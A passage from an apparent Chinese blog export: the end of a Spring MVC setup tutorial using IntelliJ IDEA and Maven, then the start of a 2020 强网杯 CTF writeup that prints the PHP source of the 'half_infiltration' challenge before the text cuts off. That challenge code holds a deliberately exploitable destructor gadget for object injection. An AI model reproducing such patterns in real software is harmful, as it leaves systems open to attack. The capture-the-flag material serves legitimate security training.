class="name">artifactId</span>&gt;</span>spring-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.17.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-expression<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.17.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 可选模块，按需添加 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- AOP --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 基于代理的AOP支持 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-aop<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.17.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 提供与AspectJ的集成 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-aspects<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.17.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.springframework/spring-web --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.17.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.springframework/spring-webmvc --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-webmvc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.17.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在<code>&lt;dependencies&gt;</code>标签中添加上面的依赖，在选择包的时候可以利用<a href="https://mvnrepository.com/这个网站搜索复制指定版本的pom.xml文件内容。" target="_blank" rel="noopener">https://mvnrepository.com/这个网站搜索复制指定版本的pom.xml文件内容。</a></p>
<p>添加框架支持，默认的web.xml是</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">web-app</span> <span class="meta-keyword">PUBLIC</span></span></span><br><span class="line"><span class="meta"> <span class="meta-string">"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"</span></span></span><br><span class="line"><span class="meta"> <span class="meta-string">"http://java.sun.com/dtd/web-app_2_3.dtd"</span> &gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>Archetype Created Web Application<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>当Add Frameworks Support之后，这里选择5.1.17.RELEASE版本的spring（如果没有Spring，在Project Structure中将Spring去掉就可以了）</p>
<img src="/2020/08/31/%E7%94%A8idea%E5%92%8Cmaven%E7%BC%96%E5%86%99spring%E9%A1%B9%E7%9B%AE/image-20200902151112372.png" alt="image-20200902151112372" style="zoom:200%;">

<p>会新生成applicationContext.xml、springMVC-servlet.xml两个文件。(不同的spring版本生成的servlet配置文件名不一定相同)</p>
<h1 id="0x04-配置-springMVC-之-xml-配置"><a href="#0x04-配置-springMVC-之-xml-配置" class="headerlink" title="0x04 配置 springMVC 之 xml 配置"></a>0x04 配置 springMVC 之 xml 配置</h1><p>默认生成的两个xml文件如下：</p>
<p>applicationContext.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>springMVC-servlet.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在web.xml中加入下面的标签配置springMVC-servlet.xml作为mvc的配置文件</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">"3.1"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>Archetype Created Web Application<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>/WEB-INF/applicationContext.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>org.springframework.web.context.ContextLoaderListener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!--welcome pages--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">welcome-file</span>&gt;</span>index.jsp<span class="tag">&lt;/<span class="name">welcome-file</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">&lt;!--配置springmvc DispatcherServlet--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>springMVC<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">      <span class="comment">&lt;!--配置dispatcher.xml作为mvc的配置文件--&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>/WEB-INF/springMVC-servlet.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">async-supported</span>&gt;</span>true<span class="tag">&lt;/<span class="name">async-supported</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>springMVC<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>编辑springMVC-servlet.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">"http://www.springframework.org/schema/context"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:mvc</span>=<span class="string">"http://www.springframework.org/schema/mvc"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">       http://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">       http://www.springframework.org/schema/context</span></span></span><br><span class="line"><span class="tag"><span class="string">       http://www.springframework.org/schema/context/spring-context.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">       http://www.springframework.org/schema/mvc</span></span></span><br><span class="line"><span class="tag"><span class="string">       http://www.springframework.org/schema/mvc/spring-mvc-3.0.xsd"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 扫描web相关的bean --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">"com.mount4in"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 开启SpringMVC注解模式 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:annotation-driven</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 静态资源默认servlet配置 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:default-servlet-handler</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 配置jsp 显示ViewResolver --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.springframework.web.servlet.view.InternalResourceViewResolver"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"viewClass"</span> <span class="attr">value</span>=<span class="string">"org.springframework.web.servlet.view.JstlView"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"prefix"</span> <span class="attr">value</span>=<span class="string">"/WEB-INF/views/"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"suffix"</span> <span class="attr">value</span>=<span class="string">".jsp"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在java文件夹新建package:<code>com.mount4in.controller</code>，之后新建IndexController.java文件,如下所示：</p>
<p>运行程序：</p>
<p><img src="/2020/08/31/%E7%94%A8idea%E5%92%8Cmaven%E7%BC%96%E5%86%99spring%E9%A1%B9%E7%9B%AE/image-20200902152142870.png" alt="image-20200902152142870"></p>
<h1 id="0x05-配置springMVC之Java配置"><a href="#0x05-配置springMVC之Java配置" class="headerlink" title="0x05 配置springMVC之Java配置"></a>0x05 配置springMVC之Java配置</h1><p>新建com.mounti4n.config包，新建WebXml、ApplicationContextXml和DispatcherServletXml类分别代替web.xml、application-context.xml和dispather-servlet.xml，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//WebXml.java</span></span><br><span class="line"><span class="keyword">package</span> com.mount4in.config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.support.AbstractAnnotationConfigDispatcherServletInitializer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WebXml</span> <span class="keyword">extends</span> <span class="title">AbstractAnnotationConfigDispatcherServletInitializer</span></span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt;[] getRootConfigClasses() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Class&lt;?&gt;[] &#123;ApplicationContextXml<span class="class">.<span class="keyword">class</span>&#125;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        &lt;!--配置springmvc DispatcherServlet--&gt;</span></span><br><span class="line"><span class="comment">        &lt;servlet&gt;</span></span><br><span class="line"><span class="comment">            &lt;servlet-name&gt;springMVC&lt;/servlet-name&gt;</span></span><br><span class="line"><span class="comment">            &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt;</span></span><br><span class="line"><span class="comment">            &lt;init-param&gt;</span></span><br><span class="line"><span class="comment">                &lt;!--配置dispatcher.xml作为mvc的配置文件--&gt;</span></span><br><span class="line"><span class="comment">                &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;</span></span><br><span class="line"><span class="comment">                &lt;param-value&gt;/WEB-INF/dispatcher-servlet.xml&lt;/param-value&gt;</span></span><br><span class="line"><span class="comment">            &lt;/init-param&gt;</span></span><br><span class="line"><span class="comment">            &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;</span></span><br><span class="line"><span class="comment">            &lt;async-supported&gt;true&lt;/async-supported&gt;</span></span><br><span class="line"><span class="comment">        &lt;/servlet&gt;</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt;[] getServletConfigClasses() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Class&lt;?&gt;[] &#123;DispatcherServletXml<span class="class">.<span class="keyword">class</span>&#125;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        &lt;servlet-mapping&gt;</span></span><br><span class="line"><span class="comment">            &lt;servlet-name&gt;springMVC&lt;/servlet-name&gt;</span></span><br><span class="line"><span class="comment">            &lt;url-pattern&gt;/&lt;/url-pattern&gt;</span></span><br><span class="line"><span class="comment">        &lt;/servlet-mapping&gt;</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> String[] getServletMappings() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> String[] &#123;<span class="string">"/"</span>&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//ApplicationContextXml.java</span></span><br><span class="line"><span class="keyword">package</span> com.mount4in.config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.ComponentScan;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.FilterType;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.EnableWebMvc;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    &lt;context:component-scan base-package="com.mount4in"/&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">@ComponentScan</span>(basePackages = &#123;<span class="string">"com.mount4in"</span>&#125;,</span><br><span class="line">        excludeFilters = &#123;</span><br><span class="line">                <span class="meta">@ComponentScan</span>.Filter(type = FilterType.ANNOTATION, value = EnableWebMvc<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class">        &#125;)</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">public</span> <span class="title">class</span> <span class="title">ApplicationContextXml</span> </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//DispatcherServletXml.java</span></span><br><span class="line"><span class="keyword">package</span> com.mount4in.config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.ComponentScan;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.ViewResolver;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.*;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.view.InternalResourceViewResolver;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@EnableWebMvc</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    &lt;!-- 自动扫描装配 --&gt;</span></span><br><span class="line"><span class="comment">    &lt;context:component-scan base-package="com.mount4in.controller"/&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">@ComponentScan</span>(<span class="string">"com.mount4in.controller"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DispatcherServletXml</span> <span class="keyword">implements</span> <span class="title">WebMvcConfigurer</span> </span>&#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            &lt;!-- 对模型视图名称的解析，即在模型视图名称添加前后缀(如果最后一个还是表示文件夹,则最后的斜杠不要漏了) 使用JSP--&gt;</span></span><br><span class="line"><span class="comment">            &lt;!-- 默认的视图解析器 在上边的解析错误时使用 (默认使用html)- --&gt;</span></span><br><span class="line"><span class="comment">            &lt;bean id="defaultViewResolver" class="org.springframework.web.servlet.view.InternalResourceViewResolver"&gt;</span></span><br><span class="line"><span class="comment">                &lt;property name="viewClass" value="org.springframework.web.servlet.view.JstlView"/&gt;</span></span><br><span class="line"><span class="comment">                &lt;property name="prefix" value="/WEB-INF/views/"/&gt;&lt;!--设置JSP文件的目录位置--&gt;</span></span><br><span class="line"><span class="comment">                &lt;property name="suffix" value=".jsp"/&gt;</span></span><br><span class="line"><span class="comment">                &lt;property name="exposeContextBeansAsAttributes" value="true"/&gt;</span></span><br><span class="line"><span class="comment">            &lt;/bean&gt;</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="meta">@Bean</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> ViewResolver <span class="title">viewResolver</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            InternalResourceViewResolver resolver = <span class="keyword">new</span> InternalResourceViewResolver();</span><br><span class="line">            resolver.setViewClass(org.springframework.web.servlet.view.JstlView<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">            resolver.setPrefix(<span class="string">"/WEB-INF/views/"</span>);</span><br><span class="line">            resolver.setSuffix(<span class="string">".jsp"</span>);</span><br><span class="line">            resolver.setExposeContextBeansAsAttributes(<span class="keyword">true</span>);</span><br><span class="line">            <span class="keyword">return</span> resolver;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">configureDefaultServletHandling</span><span class="params">(DefaultServletHandlerConfigurer configurer)</span> </span>&#123;</span><br><span class="line">            configurer.enable();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 静态资源配置</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        &lt;mvc:resources mapping="css/**" location="/WEB-INF/views/css/"/&gt;</span></span><br><span class="line"><span class="comment">        &lt;mvc:resources mapping="/js/**" location="/WEB-INF/views/js/"/&gt;</span></span><br><span class="line"><span class="comment">        &lt;mvc:resources mapping="/images/**" location="/WEB-INF/views/images/"/&gt;</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addResourceHandlers</span><span class="params">(ResourceHandlerRegistry registry)</span> </span>&#123;</span><br><span class="line">            registry.addResourceHandler(<span class="string">"/css/**"</span>).addResourceLocations(<span class="string">"/WEB-INF/views/css/"</span>);</span><br><span class="line">            registry.addResourceHandler(<span class="string">"/js/**"</span>).addResourceLocations(<span class="string">"/WEB-INF/views/js/"</span>);</span><br><span class="line">            registry.addResourceHandler(<span class="string">"/images/**"</span>).addResourceLocations(<span class="string">"/WEB-INF/views/images/"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>运行，</p>
<p><img src="/2020/08/31/%E7%94%A8idea%E5%92%8Cmaven%E7%BC%96%E5%86%99spring%E9%A1%B9%E7%9B%AE/image-20200902155802861.png" alt="image-20200902155802861"></p>
<h1 id="坑点："><a href="#坑点：" class="headerlink" title="坑点："></a>坑点：</h1><ol>
<li><p>tomcat控制台乱码问题：修改tomcat的/conf目录的logging.properties下图中指示位置为GBK。</p>
<p><img src="/2020/08/31/%E7%94%A8idea%E5%92%8Cmaven%E7%BC%96%E5%86%99spring%E9%A1%B9%E7%9B%AE/image-20200831124317263.png" alt="image-20200831124317263"></p>
</li>
<li><p>报错<code>严重 [RMI TCP Connection(3)-127.0.0.1] org.apache.tomcat.util.modeler.BaseModelMBean.invoke Exception</code></p>
<blockquote>
<ol>
<li>地址忘了加“/”</li>
</ol>
<ul>
<li>你的业务处理层<strong>Servlet注解</strong></li>
<li>你使用web.xml写的<strong>url-pattern</strong></li>
</ul>
<ol>
<li>你编译过项目后生成了target文件夹（存放你的项目字节码文件），你又修改了项目某文件名或类名，重启Tomcat就会发生这种情况。删除<strong>target文件夹</strong>，在重启Tomcat即可。<br>（我的情况，自己修改了个实体类名称，导致类加载无法找到）</li>
</ol>
<p><a href="https://blog.csdn.net/weixin_46718393/article/details/107706822" target="_blank" rel="noopener">参考</a></p>
</blockquote>
</li>
</ol>
<h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><p><a href="https://segmentfault.com/a/1190000021712028" target="_blank" rel="noopener">IntelliJ IDEA 搭建SpringMVC并用MAVEN配置</a></p>
<p><a href="https://blog.csdn.net/fenglailea/article/details/78280686" target="_blank" rel="noopener">IntelliJ IDEA上创建Maven Spring MVC项目</a></p>
<p><a href="https://blog.csdn.net/u013642500/article/details/85271965" target="_blank" rel="noopener">【从无到有】IDEA + maven + java web + springMVC + Tomcat 项目搭建</a></p>
]]></content>
  </entry>
  <entry>
    <title>2020强网杯部分题目writeup</title>
    <url>/2020/08/24/2020%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/</url>
    <content><![CDATA[<p>前言 </p>
<a id="more"></a>

<h1 id="0x01-half-infiltration"><a href="#0x01-half-infiltration" class="headerlink" title="0x01 half_infiltration"></a>0x01 half_infiltration</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">$flag=file_get_contents(<span class="string">'ssrf.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        ob_start();</span><br><span class="line">        <span class="keyword">global</span> $result;</span><br><span class="line">        <span class="keyword">print</span> $result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $age,$sex,$num;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $student = <span class="keyword">$this</span>-&gt;age;</span><br><span class="line">        $boy = <span class="keyword">$this</span>-&gt;sex;</span><br><span class="line">        $a = <span class="keyword">$this</span>-&gt;num;</span><br><span class="line">    	$student-&gt;$boy();</span><br><span class="line">    	<span class="keyword">if</span>(!(is_string($a)) ||!(is_string($boy)) || !(is_object($student)))</span><br><span class="line">    	&#123;</span><br><span class="line">        	ob_end_clean();</span><br><span class="line">        	<span class="keyword">exit</span>();</span><br><span class="line">    	&#125;</span><br><span class="line">   	 	<span class="keyword">global</span> $$a;</span><br><span class="line">    	$result=$GLOBALS[<span class="string">'flag'</span>];</span><br><span class="line">        ob_end_clean();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'x'</span>])) &#123;</span><br><span class="line">    